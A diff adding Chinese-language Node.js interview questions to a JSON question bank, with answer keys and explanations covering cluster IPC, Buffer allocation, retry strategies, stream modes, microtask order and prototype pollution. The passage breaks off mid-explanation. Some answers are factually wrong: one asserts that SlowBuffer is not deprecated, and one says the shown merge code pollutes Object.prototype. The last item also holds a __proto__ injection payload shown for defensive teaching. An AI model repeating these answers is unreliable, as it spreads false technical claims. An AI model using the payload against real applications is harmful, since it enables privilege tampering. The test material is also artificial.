+      "explanation": "这道题深入考察Cluster模式的IPC底层实现。\\n\\n**IPC实现机制**：\\n\\nNode.js的IPC使用：\\n- Unix Domain Socket（Unix/Linux/macOS）\\n- Named Pipe（Windows）\\n\\n这些是内核级的高效IPC机制：\\n- 不经过网络协议栈\\n- 零拷贝或少量拷贝\\n- 比TCP Socket更快\\n\\n**数据序列化**：\\n\\nIPC使用JSON序列化，但有特殊处理：\\n\\n1. **可传递的数据类型**：\\n   - 普通对象、数组\\n   - 字符串、数字、布尔值\\n   - Buffer（特殊处理）\\n   - Handle（如net.Socket）\\n\\n2. **不可传递的数据**：\\n   - 函数、Symbol\\n   - DOM元素\\n   - 包含循环引用的对象\\n\\n选项C错误：函数无法序列化。\\n\\n**Handle传递**：\\n\\nCluster的核心特性——传递socket handle：\\n\\n```javascript\\n// Master传递socket给Worker\\nconst server = net.createServer();\\nserver.listen(8000, () => {\\n  const worker = cluster.fork();\\n  // socket handle被传递\\n});\\n```\\n\\n这允许所有Worker监听同一个端口。\\n\\n**IPC消息格式**：\\n\\n```javascript\\n{\\n  cmd: 'NODE_CLUSTER',\\n  msg: { /* 用户数据 */ }\\n}\\n```\\n\\n**异步特性**：\\n\\n选项D部分正确：\\n\\nsend确实是异步的，但有队列和背压：\\n\\n```javascript\\n// 检查缓冲区状态\\nconst canContinue = worker.send(data);\\nif (!canContinue) {\\n  // 缓冲区满，需要等待drain\\n}\\n```\\n\\n**工程实践建议**：\\n1. 避免发送大对象\\n2. 使用Buffer传递二进制数据\\n3. 处理IPC背压\\n4. 监控IPC通信量",
+      "wrong_options_analysis": {
+        "A": "IPC不使用TCP Socket。Node.js使用Unix Domain Socket（Unix系统）或Named Pipe（Windows），这些是内核级的本地IPC机制，比TCP Socket更高效，不经过网络协议栈。",
+        "C": "IPC不能传递函数。JSON序列化无法处理函数、Symbol等类型。虽然Buffer可以特殊处理传递，但函数无法序列化。尝试传递函数会导致数据丢失或错误。",
+        "D": "虽然send是异步的，但不是'立即返回'那么简单。IPC有内部缓冲区，如果接收方处理慢，缓冲区会满。需要处理背压情况，特别是高频消息场景。"
+      },
+      "knowledge_point": "Cluster_IPC_Mechanism",
+      "reference_link": "https://nodejs.org/api/cluster.html#cluster_event_message"
+    },
+    {
+      "id": "node-senior-038",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Buffer", "SlowBuffer", "大内存"],
+      "source_company": "Alibaba",
+      "score": 8,
+      "title": "SlowBuffer与大Buffer分配",
+      "content": "关于SlowBuffer和大Buffer的内存分配，以下描述正确的是？\\n\\n```javascript\\nconst { SlowBuffer } = require('buffer');\\n\\n// 创建大Buffer的两种方式\\nconst buf1 = Buffer.allocUnsafe(10 * 1024 * 1024);  // 10MB\\nconst buf2 = new SlowBuffer(10 * 1024 * 1024);      // 10MB\\n```",
+      "options": [
+        { "id": "A", "text": "buf1和buf2都从8KB内存池分配" },
+        { "id": "B", "text": "buf1直接分配独立内存，buf2使用内存池" },
+        {
+          "id": "C",
+          "text": "两者都直接分配独立内存，但SlowBuffer不会被内存池管理"
+        },
+        { "id": "D", "text": "SlowBuffer已被废弃，不应该使用" }
+      ],
+      "correct_answer": "C",
+      "explanation": "这道题深入考察大Buffer的内存分配策略和SlowBuffer的作用。\\n\\n**内存池策略回顾**：\\n\\nNode.js Buffer使用8KB内存池优化小Buffer分配：\\n- 小于4KB：从池分配\\n- 大于4KB：直接分配\\n\\n**Buffer.allocUnsafe的行为**：\\n\\n```javascript\\nconst buf = Buffer.allocUnsafe(10 * 1024 * 1024);\\n```\\n\\n内部判断：\\n- 如果大小 > poolSize / 2（4KB）\\n- 直接使用SlowBuffer分配\\n- 不走内存池\\n\\n**SlowBuffer的本质**：\\n\\n```javascript\\n// SlowBuffer是Buffer的内部实现\\nclass SlowBuffer extends Uint8Array {\\n  constructor(size) {\\n    super(size);  // 直接分配 ArrayBuffer\\n  }\\n}\\n```\\n\\nSlowBuffer特点：\\n- 直接分配ArrayBuffer\\n- 不从内存池分配\\n- 不会被池管理\\n- 适合大Buffer场景\\n\\n**两种方式的区别**：\\n\\n| 特性 | Buffer.allocUnsafe(大) | SlowBuffer |\\n|------|------------------------|------------|\\n| 内存来源 | 独立分配 | 独立分配 |\\n| 内存池 | 不使用 | 不使用 |\\n| 初始化 | 不清零 | 不清零 |\\n| 用途 | 用户API | 内部实现 |\\n\\n实际效果相似，但语义不同：\\n- Buffer.allocUnsafe是公共API\\n- SlowBuffer是底层实现细节\\n\\n**内存释放**：\\n\\n大Buffer的释放：\\n- 不受内存池管理\\n- 由V8 GC直接管理\\n- 作为独立对象回收\\n\\n**工程实践建议**：\\n1. 使用Buffer.alloc/allocUnsafe作为公共API\\n2. 理解内存池的作用范围\\n3. 大Buffer注意内存压力\\n4. 及时释放不用的Buffer",
+      "wrong_options_analysis": {
+        "A": "10MB的Buffer远大于8KB内存池，不会从池分配。只有小于4KB的Buffer才会使用内存池，超过的都直接独立分配。",
+        "B": "两种方式都直接分配独立内存，不走内存池。区别在于SlowBuffer是内部实现类，Buffer.allocUnsafe是公共API，但大Buffer时底层都使用独立分配。",
+        "D": "SlowBuffer没有被废弃。它仍然存在并用于内部实现。只是用户通常不需要直接使用，应该使用Buffer.alloc/allocUnsafe等公共API。"
+      },
+      "knowledge_point": "SlowBuffer_Large_Allocation",
+      "reference_link": "https://nodejs.org/api/buffer.html#buffer_class_slowbuffer"
+    },
+    {
+      "id": "node-senior-039",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["微服务", "重试策略", "指数退避"],
+      "source_company": "Meituan",
+      "score": 10,
+      "title": "微服务重试与指数退避",
+      "content": "关于微服务架构中的重试策略和指数退避，以下说法正确的是？",
+      "options": [
+        { "id": "A", "text": "指数退避通过每次重试间隔时间翻倍来避免服务过载" },
+        { "id": "B", "text": "重试策略应该对幂等操作和非幂等操作区别对待" },
+        { "id": "C", "text": "添加随机抖动（Jitter）可以避免重试风暴" },
+        { "id": "D", "text": "重试次数越多越好，确保请求最终成功" },
+        { "id": "E", "text": "超时和重试需要配合使用，超时后应该重试" }
+      ],
+      "correct_answer": ["A", "B", "C"],
+      "explanation": "这道题系统考察微服务重试策略的设计原则。\\n\\n**指数退避算法**：\\n\\n```javascript\\nasync function retryWithBackoff(fn, maxRetries = 3) {\\n  for (let i = 0; i < maxRetries; i++) {\\n    try {\\n      return await fn();\\n    } catch (err) {\\n      if (i === maxRetries - 1) throw err;\\n      \\n      // 指数退避：1s, 2s, 4s, 8s...\\n      const delay = Math.pow(2, i) * 1000;\\n      await sleep(delay);\\n    }\\n  }\\n}\\n```\\n\\n**幂等性考虑**：\\n\\n选项B正确。需要区分：\\n\\n| 操作类型 | 示例 | 重试安全 |\\n|----------|------|----------|\\n| 幂等 | GET请求、删除操作 | 安全 |\\n| 非幂等 | POST创建订单 | 不安全 |\\n\\n非幂等操作重试可能导致重复创建。\\n\\n**抖动（Jitter）**：\\n\\n选项C正确。添加随机性：\\n\\n```javascript\\nconst baseDelay = Math.pow(2, i) * 1000;\\nconst jitter = Math.random() * 1000;  // 随机0-1000ms\\nawait sleep(baseDelay + jitter);\\n```\\n\\n作用：\\n- 避免多个客户端同时重试\\n- 分散请求压力\\n- 防止重试风暴\\n\\n**重试次数控制**：\\n\\n选项D错误。\\n\\n重试次数过多的问题：\\n- 增加延迟\\n- 浪费资源\\n- 可能加剧服务压力\\n\\n通常设置3-5次重试上限。\\n\\n**超时与重试配合**：\\n\\n选项E需要细化：\\n\\n```javascript\\nasync function callWithRetry() {\\n  const timeout = 5000;\\n  try {\\n    return await Promise.race([\\n      serviceCall(),\\n      timeoutPromise(timeout)\\n    ]);\\n  } catch (err) {\\n    // 超时和错误都可能导致重试\\n    // 但需要根据错误类型判断\\n  }\\n}\\n```\\n\\n**完整的重试策略**：\\n\\n```javascript\\nconst retryPolicy = {\\n  maxRetries: 3,\\n  initialDelay: 1000,\\n  maxDelay: 30000,\\n  multiplier: 2,\\n  jitter: true,\\n  retryableErrors: ['ETIMEDOUT', 'ECONNRESET', '503']\\n};\\n```\\n\\n**工程实践建议**：\\n1. 区分幂等和非幂等操作\\n2. 使用指数退避+抖动\\n3. 设置合理的重试上限\\n4. 记录重试日志\\n5. 配合熔断器使用",
+      "exclusion_analysis": {
+        "D": "重试次数不是越多越好。过多重试会增加延迟、浪费资源，而且如果服务持续不可用，重试只会加剧压力。通常设置3-5次上限，配合熔断器在服务故障时快速失败。",
+        "E": "超时后不一定应该重试。需要根据超时原因判断：如果是服务过载导致的超时，盲目重试会加剧压力。应该配合熔断器，在错误率达到阈值时停止重试。"
+      },
+      "knowledge_point": "Microservice_Retry_Backoff",
+      "reference_link": "https://aws.amazon.com/blogs/architecture/exponential-backoff-and-jitter/"
+    },
+    {
+      "id": "node-senior-040",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["BFF", "API网关", "聚合模式"],
+      "source_company": "ByteDance",
+      "score": 8,
+      "title": "BFF层API聚合模式",
+      "content": "关于BFF层的API聚合模式，以下描述正确的是？\\n\\n场景：移动端需要展示用户信息页面，包含用户基本信息、订单列表、积分信息，分别来自三个不同的后端服务。",
+      "options": [
+        { "id": "A", "text": "并行请求三个服务，使用Promise.all聚合结果" },
+        { "id": "B", "text": "串行请求三个服务，确保数据一致性" },
+        {
+          "id": "C",
+          "text": "根据依赖关系设计：无依赖并行，有依赖串行，配合缓存优化"
+        },
+        { "id": "D", "text": "由后端服务实现聚合接口，BFF只做转发" }
+      ],
+      "correct_answer": "C",
+      "explanation": "这道题考察BFF层的API聚合设计模式。\\n\\n**API聚合模式分析**：\\n\\n1. **并行模式**（无依赖）：\\n```javascript\\nconst [user, orders, points] = await Promise.all([\\n  userService.getUser(userId),\\n  orderService.getOrders(userId),\\n  pointsService.getPoints(userId)\\n]);\\n```\\n\\n优点：响应时间取决于最慢的服务\\n缺点：无法处理依赖关系\\n\\n2. **串行模式**（有依赖）：\\n```javascript\\nconst user = await userService.getUser(userId);\\nconst orders = await orderService.getOrders(user.accountId);\\n```\\n\\n优点：处理依赖关系\\n缺点：响应时间叠加\\n\\n3. **混合模式**（最佳实践）：\\n\\n分析依赖关系：\\n```\\n用户基本信息 → 无依赖 → 并行\\n订单列表 → 无依赖 → 并行\\n积分信息 → 可能依赖用户类型 → 条件并行/串行\\n```\\n\\n**完整的聚合实现**：\\n\\n```javascript\\nasync function getUserDashboard(userId) {\\n  // 第一层：无依赖的并行请求\\n  const [user, orders] = await Promise.all([\\n    cache.wrap('user', userId, () => userService.getUser(userId)),\\n    cache.wrap('orders', userId, () => orderService.getOrders(userId))\\n  ]);\\n  \\n  // 第二层：依赖第一层数据\\n  const points = await pointsService.getPoints(user.accountType, userId);\\n  \\n  return { user, orders, points };\\n}\\n```\\n\\n**缓存策略**：\\n\\n```javascript\\nconst cacheStrategies = {\\n  user: { ttl: 300, staleWhileRevalidate: true },\\n  orders: { ttl: 60 },\\n  points: { ttl: 120 }\\n};\\n```\\n\\n**错误处理**：\\n\\n```javascript\\nconst results = await Promise.allSettled([\\n  userService.getUser(userId),\\n  orderService.getOrders(userId),\\n  pointsService.getPoints(userId)\\n]);\\n\\n// 部分失败降级处理\\nconst user = results[0].status === 'fulfilled' ? results[0].value : null;\\n```\\n\\n**工程实践建议**：\\n1. 分析服务依赖关系\\n2. 合理使用并行和串行\\n3. 添加缓存层\\n4. 实现降级策略\\n5. 监控聚合接口性能",
+      "wrong_options_analysis": {
+        "A": "简单并行可能忽略服务间的依赖关系。如果某个服务需要另一个服务的结果作为参数，并行请求会导致失败或返回不完整数据。需要根据依赖关系设计。",
+        "B": "完全串行会显著增加响应时间。如果三个服务无依赖关系，串行请求会使总响应时间等于三个服务响应时间之和，而不是取决于最慢的服务。",
+        "D": "这违背了BFF的设计理念。BFF的核心价值就是为不同前端提供定制化的数据聚合，如果后端实现聚合接口，BFF就退化为简单的转发层，失去了存在的意义。"
+      },
+      "knowledge_point": "BFF_API_Aggregation",
+      "reference_link": "https://samnewman.io/patterns/architecture/bff/"
+    },
+    {
+      "id": "node-senior-041",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["libuv", "prepare阶段", "线程池"],
+      "source_company": "Google",
+      "score": 10,
+      "title": "libuv prepare阶段与线程池交互",
+      "content": "关于libuv Event Loop的prepare阶段及其与线程池的交互，以下描述正确的是？",
+      "options": [
+        {
+          "id": "A",
+          "text": "prepare阶段在poll阶段之前执行，主要用于准备I/O观察者"
+        },
+        {
+          "id": "B",
+          "text": "prepare阶段的回调可以用来在poll阻塞前执行准备工作"
+        },
+        { "id": "C", "text": "线程池任务完成后的回调会在prepare阶段执行" },
+        {
+          "id": "D",
+          "text": "prepare阶段是Node.js保留的内部阶段，用户代码无法使用"
+        }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察libuv Event Loop的prepare阶段设计和用途。\\n\\n**Event Loop阶段顺序**：\\n\\n```\\ntimers → pending callbacks → idle → prepare → poll → check → close callbacks\\n```\\n\\n**prepare阶段特性**：\\n\\n1. **位置**：\\n   - 在idle阶段之后\\n   - 在poll阶段之前\\n   - 每次循环都会执行\\n\\n2. **用途**：\\n   - libuv内部使用\\n   - 用户可注册回调\\n   - 在poll阻塞前执行准备\\n\\n**prepare阶段的使用**：\\n\\n```javascript\\nconst uv = require('uv'); // 假设的libuv绑定\\n\\n// 实际Node.js不直接暴露，但可以理解其作用\\n// prepare回调在每次poll之前执行\\n```\\n\\n**与线程池的关系**：\\n\\n选项C错误。\\n\\n线程池任务完成的回调在pending callbacks阶段执行，不是prepare阶段：\\n\\n```\\n线程池任务完成\\n  ↓\\n回调放入pending队列\\n  ↓\\npending callbacks阶段执行\\n```\\n\\n**idle和prepare的区别**：\\n\\n| 阶段 | 特点 | 用途 |\\n|------|------|------|\\n| idle | 每次循环都执行 | 内部使用 |\\n| prepare | 每次循环都执行 | poll前准备 |\\n\\n两者都是libuv内部阶段，区别在于语义和位置。\\n\\n**用户代码的使用**：\\n\\n选项D错误。\\n\\n虽然Node.js没有直接暴露prepare阶段API，但可以通过底层绑定访问：\\n\\n```javascript\\n// 通过native addon可以注册prepare回调\\n// 实际使用较少\\n```\\n\\n**工程实践意义**：\\n\\n理解prepare阶段有助于：\\n- 深入理解Event Loop\\n- 性能分析和调优\\n- 调试I/O相关问题\\n\\n**工程实践建议**：\\n1. 理解Event Loop阶段顺序\\n2. 知道各阶段的用途\\n3. 正确诊断I/O问题\\n4. 合理安排异步操作",
+      "wrong_options_analysis": {
+        "A": "prepare阶段确实在poll之前，但它不是用来准备I/O观察者。I/O观察者是通过uv_io_start注册的。prepare阶段主要用于libuv内部和一些需要在poll前执行的准备工作。",
+        "C": "线程池任务完成后的回调在pending callbacks阶段执行，不是prepare阶段。pending callbacks专门用于处理上一轮poll中执行的I/O回调，包括线程池任务。",
+        "D": "prepare阶段虽然是libuv内部阶段，但通过native addon可以注册回调。Node.js核心没有直接暴露，但用户代码并非完全无法使用，只是实际使用场景很少。"
+      },
+      "knowledge_point": "libuv_Prepare_Phase",
+      "reference_link": "https://docs.libuv.org/en/v1.x/design.html#the-i-o-loop"
+    },
+    {
+      "id": "node-senior-042",
+      "type": "multiple_choice",
+      "difficulty": "senior",
+      "tags": ["Stream", "Object Mode", "对象流"],
+      "source_company": "Tencent",
+      "score": 10,
+      "title": "Stream Object模式",
+      "content": "关于Node.js Stream的Object模式，以下说法正确的是？\\n\\n```javascript\\nconst { Readable, Transform } = require('stream');\\n\\nconst readable = new Readable({\\n  objectMode: true,\\n  read() {\\n    this.push({ id: 1, name: 'Alice' });\\n    this.push({ id: 2, name: 'Bob' });\\n    this.push(null);\\n  }\\n});\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "Object模式下，highWaterMark表示对象数量而非字节数"
+        },
+        {
+          "id": "B",
+          "text": "Object模式的流可以传递任意JavaScript对象，包括函数"
+        },
+        { "id": "C", "text": "Transform流可以分别设置输入和输出的objectMode" },
+        { "id": "D", "text": "Object模式和非Object模式的流不能直接pipe连接" },
+        { "id": "E", "text": "Object模式的流传递对象引用，不进行序列化" }
+      ],
+      "correct_answer": ["A", "C", "E"],
+      "explanation": "这道题深入考察Stream Object模式的工作原理。\\n\\n**Object模式特性**：\\n\\n1. **highWaterMark含义**：\\n   - 普通模式：字节数\\n   - Object模式：对象数量\\n   \\n   ```javascript\\n   const readable = new Readable({\\n     objectMode: true,\\n     highWaterMark: 10  // 最多缓冲10个对象\\n   });\\n   ```\\n\\n2. **对象传递方式**：\\n   - 传递对象引用\\n   - 不进行序列化\\n   - 同一进程内高效传递\\n\\n**Transform流的Object模式**：\\n\\n选项C正确：\\n\\n```javascript\\nconst transform = new Transform({\\n  readableObjectMode: true,   // 输出是对象\\n  writableObjectMode: false,  // 输入是Buffer\\n  transform(chunk, encoding, callback) {\\n    // chunk是Buffer\\n    const obj = JSON.parse(chunk);\\n    this.push(obj);  // 输出对象\\n    callback();\\n  }\\n});\\n```\\n\\n**Object模式限制**：\\n\\n选项B错误：\\n\\n虽然Object模式可以传递大多数对象，但有限制：\\n- 函数理论上可以传递，但不推荐\\n- 存在循环引用的对象可能导致问题\\n- 主要用于数据对象\\n\\n**与非Object模式的连接**：\\n\\n选项D错误：\\n\\n可以通过Transform流转换：\\n\\n```javascript\\n// Buffer流 → Object流\\nconst toJSON = new Transform({\\n  writableObjectMode: false,\\n  readableObjectMode: true,\\n  transform(chunk, encoding, callback) {\\n    this.push(JSON.parse(chunk));\\n    callback();\\n  }\\n});\\n```\\n\\n**实际应用场景**：\\n\\n```javascript\\n// 数据处理管道\\nreadableObjectStream\\n  .pipe(filterTransform)    // 过滤对象\\n  .pipe(mapTransform)       // 转换对象\\n  .pipe(stringifyTransform) // 转为字符串\\n  .pipe(process.stdout);\\n```\\n\\n**工程实践建议**：\\n1. 数据处理管道使用Object模式\\n2. 合理设置highWaterMark\\n3. 注意对象引用的副作用\\n4. 使用Transform进行模式转换",
+      "exclusion_analysis": {
+        "B": "虽然Object模式可以传递函数（传递的是引用），但这不是推荐的做法。函数的上下文和闭包可能导致意外的副作用。Object模式主要用于传递数据对象。",
+        "D": "Object模式和非Object模式的流可以通过Transform流连接。Transform可以分别设置输入和输出的objectMode，实现Buffer和对象之间的转换。这是常见的模式。"
+      },
+      "knowledge_point": "Stream_Object_Mode",
+      "reference_link": "https://nodejs.org/api/stream.html#stream_object_mode"
+    },
+    {
+      "id": "node-senior-043",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["Event Loop", "微任务", "Promise"],
+      "source_company": "Alibaba",
+      "score": 8,
+      "title": "Promise微任务与nextTick执行顺序",
+      "content": "关于Promise微任务和process.nextTick的执行顺序，以下描述正确的是？\\n\\n```javascript\\nconsole.log('start');\\n\\nPromise.resolve().then(() => console.log('promise'));\\nprocess.nextTick(() => console.log('nextTick'));\\n\\nconsole.log('end');\\n```",
+      "options": [
+        { "id": "A", "text": "输出顺序：start, end, promise, nextTick" },
+        { "id": "B", "text": "输出顺序：start, end, nextTick, promise" },
+        { "id": "C", "text": "输出顺序：start, nextTick, promise, end" },
+        { "id": "D", "text": "输出顺序不确定，取决于V8实现" }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察Node.js微任务队列的执行顺序。\\n\\n**Node.js微任务队列结构**：\\n\\nNode.js有两个微任务队列：\\n\\n1. **nextTickQueue**：\\n   - process.nextTick注册的回调\\n   - 优先级最高\\n\\n2. **Promise微任务队列**：\\n   - Promise.then/catch/finally\\n   - queueMicrotask注册的回调\\n   - 优先级次高\\n\\n**执行顺序规则**：\\n\\n在每个阶段结束后：\\n```\\n1. 清空nextTickQueue\\n2. 清空Promise微任务队列\\n3. 继续下一阶段\\n```\\n\\n**示例执行流程**：\\n\\n```javascript\\nconsole.log('start');\\n\\n// 1. 注册微任务\\nPromise.resolve().then(() => console.log('promise'));\\n// → Promise微任务队列：['promise callback']\\n\\nprocess.nextTick(() => console.log('nextTick'));\\n// → nextTick队列：['nextTick callback']\\n\\nconsole.log('end');\\n\\n// 同步代码结束，开始执行微任务\\n// 2. 先清空nextTick队列\\n// → 输出 'nextTick'\\n\\n// 3. 再清空Promise队列\\n// → 输出 'promise'\\n```\\n\\n**输出结果**：\\n```\\nstart\\nend\\nnextTick\\npromise\\n```\\n\\n**与浏览器的差异**：\\n\\n浏览器没有nextTickQueue：\\n- 只有Promise微任务队列\\n- process.nextTick不存在\\n\\n**最佳实践**：\\n\\n```javascript\\n// 推荐：使用queueMicrotask（跨平台）\\nqueueMicrotask(() => console.log('microtask'));// \\n// 避免：process.nextTick（Node.js特有）\\nprocess.nextTick(() => console.log('nextTick'));\\n```\\n\\n**工程实践建议**：\\n1. 理解nextTick优先级高于Promise\\n2. 使用queueMicrotask保证跨平台兼容\\n3. 避免在nextTick中递归\\n4. 警惕nextTick导致的I/O饥饿",
+      "wrong_options_analysis": {
+        "A": "错误地认为Promise微任务先于nextTick执行。实际上nextTick队列优先级最高，会先被清空，然后才是Promise微任务队列。",
+        "C": "错误地认为微任务在同步代码中间执行。微任务在同步代码完全结束后才执行，所以'end'应该在微任务之前输出。",
+        "D": "执行顺序是确定的，不是不确定的。Node.js规范明确定义了nextTick队列优先于Promise微任务队列。这是稳定的行为。"
+      },
+      "knowledge_point": "Promise_nextTick_Order",
+      "reference_link": "https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/"
+    },
+    {
+      "id": "node-senior-044",
+      "type": "multiple_choice",
+      "difficulty": "expert",
+      "tags": ["内存泄漏", "WeakMap", "WeakRef"],
+      "source_company": "ByteDance",
+      "score": 12,
+      "title": "WeakMap与内存泄漏防护",
+      "content": "关于使用WeakMap和WeakRef防止内存泄漏，以下说法正确的是？",
+      "options": [
+        {
+          "id": "A",
+          "text": "WeakMap的键必须是对象，且是弱引用，不阻止垃圾回收"
+        },
+        {
+          "id": "B",
+          "text": "WeakRef允许持有对象的弱引用，不会阻止对象被回收"
+        },
+        { "id": "C", "text": "使用WeakMap可以避免缓存导致的内存泄漏" },
+        {
+          "id": "D",
+          "text": "FinalizationRegistry可以在对象被回收时执行清理回调"
+        },
+        { "id": "E", "text": "WeakMap是可枚举的，可以使用for...of遍历" }
+      ],
+      "correct_answer": ["A", "B", "C", "D"],
+      "explanation": "这道题深入考察JavaScript弱引用机制及其在内存管理中的应用。\\n\\n**WeakMap特性**：\\n\\n```javascript\\nconst weakMap = new WeakMap();\\nlet obj = { id: 1 };\\n\\nweakMap.set(obj, 'metadata');\\nconsole.log(weakMap.get(obj)); // 'metadata'\\n\\nobj = null;  // 对象可被回收\\n// WeakMap中的条目会自动清理\\n```\\n\\n关键特性：\\n- 键必须是对象\\n- 键是弱引用\\n- 不阻止键对象被回收\\n- 不可枚举\\n\\n**WeakRef使用**：\\n\\n```javascript\\nconst weakRef = new WeakRef({ data: 'large object' });\\n\\n// 获取对象（可能返回undefined）\\nconst obj = weakRef.deref();\\nif (obj) {\\n  console.log(obj.data);\\n}\\n```\\n\\n用途：\\n- 缓存大对象\\n- 观察对象生命周期\\n- 不阻止垃圾回收\\n\\n**缓存场景应用**：\\n\\n```javascript\\nconst cache = new WeakMap();\\n\\nfunction getMetadata(obj) {\\n  if (!cache.has(obj)) {\\n    cache.set(obj, computeMetadata(obj));\\n  }\\n  return cache.get(obj);\\n}\\n\\n// 当obj被回收，缓存自动清理\\n```\\n\\n**FinalizationRegistry**：\\n\\n```javascript\\nconst registry = new FinalizationRegistry((heldValue) => {\\n  console.log(`Object ${heldValue} was collected`);\\n});\\n\\nlet obj = { id: 1 };\\nregistry.register(obj, 'obj-1');\\n\\nobj = null;  // 对象被回收时触发回调\\n```\\n\\n**不可枚举的原因**：\\n\\n选项E错误。\\n\\nWeakMap不可枚举是因为：\\n- 键可能随时被回收\\n- 枚举结果不可靠\\n- 性能考虑\\n\\n**工程实践建议**：\\n1. 对象关联数据使用WeakMap\\n2. 缓存场景考虑WeakRef\\n3. 清理逻辑使用FinalizationRegistry\\n4. 避免过度依赖FinalizationRegistry时序",
+      "exclusion_analysis": {
+        "E": "WeakMap是不可枚举的。不能使用for...of、Object.keys()等方法遍历。这是设计决策：因为键是弱引用，随时可能被回收，枚举结果不可靠。如果需要可枚举的映射，应该使用普通Map。"
+      },
+      "knowledge_point": "WeakMap_Memory_Leak",
+      "reference_link": "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakMap"
+    },
+    {
+      "id": "node-senior-045",
+      "type": "single_choice",
+      "difficulty": "senior",
+      "tags": ["HTTP/2", "Server Push", "性能"],
+      "source_company": "Meituan",
+      "score": 8,
+      "title": "HTTP/2 Server Push实现",
+      "content": "关于Node.js中HTTP/2 Server Push的实现，以下描述正确的是？\\n\\n```javascript\\nconst http2 = require('http2');\\nconst server = http2.createSecureServer(options);\\n\\nserver.on('stream', (stream, headers) => {\\n  stream.respond({ 'content-type': 'text/html' });\\n  stream.end('<html>...</html>');\\n  \\n  // 如何推送关联资源？\\n});\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "使用stream.pushStream方法推送关联资源，客户端必须接受"
+        },
+        {
+          "id": "B",
+          "text": "Server Push可以预推送CSS、JS等资源，减少请求延迟"
+        },
+        { "id": "C", "text": "Server Push在HTTP/3中已废弃，不建议使用" },
+        { "id": "D", "text": "Node.js不支持HTTP/2 Server Push" }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题考察HTTP/2 Server Push在Node.js中的实现和应用。\\n\\n**Server Push实现**：\\n\\n```javascript\\nconst http2 = require('http2');\\n\\nserver.on('stream', (stream, headers) => {\\n  // 主响应\\n  stream.respond({ 'content-type': 'text/html' });\\n  stream.end('<html>...</html>');\\n  \\n  // 推送关联资源\\n  stream.pushStream({ ':path': '/style.css' }, (err, pushStream) => {\\n    if (err) throw err;\\n    pushStream.respond({ 'content-type': 'text/css' });\\n    pushStream.end('body { ... }');\\n  });\\n});\\n```\\n\\n**Server Push优势**：\\n\\n1. **减少延迟**：\\n   - 客户端发现资源前就推送\\n   - 省去请求往返时间\\n\\n2. **适用场景**：\\n   - CSS/JS预加载\\n   - 图片预推送\\n   - 关键资源优先\\n\\n**客户端控制**：\\n\\n选项A错误。\\n\\n客户端可以拒绝Push：\\n\\n```javascript\\n// 客户端设置\\nconst client = http2.connect('https://example.com', {\\n  settings: {\\n    enablePush: false  // 拒绝Server Push\\n  }\\n});\\n```\\n\\n**HTTP/3的变化**：\\n\\n选项C不完全正确。\\n\\nHTTP/3的变更：\\n- Server Push仍是可选功能\\n- 但浏览器支持减少\\n- Chrome已禁用\\n\\n原因：\\n- 缓存匹配困难\\n- 推送可能浪费带宽\\n\\n**现代替代方案**：\\n\\n```html\\n<!-- 使用Preload替代 -->\\n<link rel=\\\"preload\\\" href=\\\"/style.css\\\" as=\\\"style\\\">\\n<link rel=\\\"preload\\\" href=\\\"/script.js\\\" as=\\\"script\\\">\\n```\\n\\n**工程实践建议**：\\n1. 谨慎使用Server Push\\n2. 优先考虑Preload\\n3. 检查客户端支持\\n4. 监控推送命中率\\n5. 考虑HTTP/3演进",
+      "wrong_options_analysis": {
+        "A": "客户端不是必须接受Server Push。客户端可以通过SETTINGS_ENABLE_PUSH设置为0来拒绝推送。而且即使接受，推送的资源也会受缓存策略影响。",
+        "C": "Server Push在HTTP/3中没有完全废弃，仍是可选功能。但浏览器支持确实在减少，Chrome已禁用。原因是推送效率不如预期，现代更多使用Preload替代。",
+        "D": "Node.js完全支持HTTP/2 Server Push。http2模块提供了pushStream方法实现推送功能。这是HTTP/2的核心特性之一，Node.js从v8.4.0开始支持。"
+      },
+      "knowledge_point": "HTTP2_Server_Push",
+      "reference_link": "https://nodejs.org/api/http2.html#http2_server_push"
+    },
+    {
+      "id": "node-senior-046",
+      "type": "single_choice",
+      "difficulty": "expert",
+      "tags": ["安全", "原型链污染", "Object.assign"],
+      "source_company": "Tencent",
+      "score": 10,
+      "title": "原型链污染防御",
+      "content": "关于JavaScript原型链污染及其防御，以下描述正确的是？\\n\\n```javascript\\n// 危险代码示例\\nfunction merge(target, source) {\\n  for (let key in source) {\\n    if (key in target) {\\n      target[key] = source[key];\\n    }\\n  }\\n}\\n\\nmerge({}, JSON.parse('{\\\"__proto__\\\": {\\\"admin\\\": true}}'));\\n```",
+      "options": [
+        {
+          "id": "A",
+          "text": "使用Object.hasOwnProperty检查可以完全防止原型链污染"
+        },
+        {
+          "id": "B",
+          "text": "Object.create(null)创建无原型对象，是更安全的merge目标"
+        },
+        { "id": "C", "text": "JSON.parse不会解析__proto__属性，上述代码安全" },
+        { "id": "D", "text": "使用Object.assign代替手动merge可以避免污染" }
+      ],
+      "correct_answer": "B",
+      "explanation": "这道题深入考察原型链污染的原理和防御策略。\\n\\n**原型链污染原理**：\\n\\n```javascript\\nconst payload = JSON.parse('{\\\"__proto__\\\": {\\\"admin\\\": true}}');\\n// payload = { __proto__: { admin: true } }\\n\\n// 当merge时\\nfor (let key in payload) {\\n  // key = '__proto__'\\n  target[key] = payload[key];\\n  // target.__proto__ = { admin: true }\\n  // 修改了Object.prototype!\\n}\\n\\n// 结果：所有对象继承admin属性\\n({}).admin; // true\\n```\\n\\n**防御策略分析**：\\n\\n**选项A问题**：\\n\\nhasOwnProperty检查有漏洞：\\n```javascript\\n// 仍然危险\\nif (Object.prototype.hasOwnProperty.call(source, key)) {\\n  target[key] = source[key]; // key可能是__proto__\\n}\\n```\\n\\n需要额外过滤__proto__、constructor、prototype。\\n\\n**选项B正确**：\\n\\n```javascript\\nconst safeMerge = (target, source) => {\\n  const result = Object.create(null);  // 无原型\\n  for (let key in source) {\\n    if (key !== '__proto__' && key !== 'constructor') {\\n      result[key] = source[key];\\n    }\\n  }\\n  return 